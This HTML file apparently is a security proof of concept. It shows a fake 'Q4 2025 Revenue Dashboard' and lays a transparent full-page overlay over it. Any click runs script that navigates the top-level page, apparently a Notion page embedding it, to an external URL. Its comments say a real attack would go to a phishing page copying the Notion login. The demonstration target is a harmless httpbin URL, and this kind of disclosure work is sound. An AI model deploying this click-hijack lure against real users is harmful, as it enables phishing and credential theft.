<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }

body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
    background: #ffffff;
    color: #37352f;
    cursor: pointer;
    height: 100vh;
    overflow: hidden;
}

.container {
    padding: 32px 40px;
    max-width: 800px;
    margin: 0 auto;
}

.header {
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 24px;
}

.icon {
    width: 40px;
    height: 40px;
    background: #f1f1ef;
    border-radius: 8px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 22px;
}

.title {
    font-size: 18px;
    font-weight: 600;
    color: #37352f;
}

.subtitle {
    font-size: 13px;
    color: #9b9a97;
    margin-top: 2px;
}

.chart-area {
    background: #fbfbfa;
    border: 1px solid #e9e9e7;
    border-radius: 8px;
    padding: 24px;
    margin: 16px 0;
}

.chart-title {
    font-size: 14px;
    font-weight: 500;
    color: #37352f;
    margin-bottom: 16px;
}

.bars {
    display: flex;
    align-items: flex-end;
    gap: 16px;
    height: 140px;
    padding: 0 12px;
}

.bar-group {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 8px;
}

.bar {
    width: 100%;
    border-radius: 4px 4px 0 0;
    min-height: 20px;
}

.bar-label {
    font-size: 11px;
    color: #9b9a97;
}

.bar-value {
    font-size: 12px;
    font-weight: 600;
    color: #37352f;
}

.legend {
    display: flex;
    gap: 20px;
    margin-top: 16px;
    justify-content: center;
}

.legend-item {
    display: flex;
    align-items: center;
    gap: 6px;
    font-size: 12px;
    color: #6b6b6b;
}

.legend-dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
}

.cta {
    text-align: center;
    margin-top: 20px;
    padding: 12px;
    color: #2eaadc;
    font-size: 13px;
}

.cta-icon {
    display: inline-block;
    margin-right: 4px;
}

.overlay {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    z-index: 999;
    cursor: pointer;
}
</style>
</head>
<body>

<!-- 투명 오버레이: 어디를 클릭해도 리다이렉트 -->
<div class="overlay" id="clickTarget"></div>

<div class="container">
    <div class="header">
        <div class="icon">📊</div>
        <div>
            <div class="title">Q4 2025 Revenue Dashboard</div>
            <div class="subtitle">Last updated: March 15, 2026 · Shared by Finance Team</div>
        </div>
    </div>

    <div class="chart-area">
        <div class="chart-title">Monthly Revenue (USD, thousands)</div>
        <div class="bars">
            <div class="bar-group">
                <div class="bar-value">$842K</div>
                <div class="bar" style="height:65%; background:#2eaadc;"></div>
                <div class="bar-label">Oct</div>
            </div>
            <div class="bar-group">
                <div class="bar-value">$915K</div>
                <div class="bar" style="height:75%; background:#2eaadc;"></div>
                <div class="bar-label">Nov</div>
            </div>
            <div class="bar-group">
                <div class="bar-value">$1.1M</div>
                <div class="bar" style="height:90%; background:#2eaadc;"></div>
                <div class="bar-label">Dec</div>
            </div>
            <div class="bar-group">
                <div class="bar-value">$1.3M</div>
                <div class="bar" style="height:100%; background:#0f7b5f;"></div>
                <div class="bar-label">Jan</div>
            </div>
        </div>
        <div class="legend">
            <div class="legend-item"><div class="legend-dot" style="background:#2eaadc;"></div> Q4 2025</div>
            <div class="legend-item"><div class="legend-dot" style="background:#0f7b5f;"></div> Q1 2026</div>
        </div>
    </div>

    <div class="cta">
        <span class="cta-icon">🔗</span>
        Click anywhere to view the interactive dashboard
    </div>
</div>

<script>
document.getElementById('clickTarget').addEventListener('click', function() {
    // PoC: Redirects the entire Notion page to an external site when the user clicks
    // In a real attack, this would be a phishing site mimicking the Notion login page
    // Since this is a PoC, it redirects to httpbin to demonstrate success
    window.top.location = 'https://httpbin.org/get?proof=notion-embed-top-navigation-poc';
});
</script>

</body>
</html>
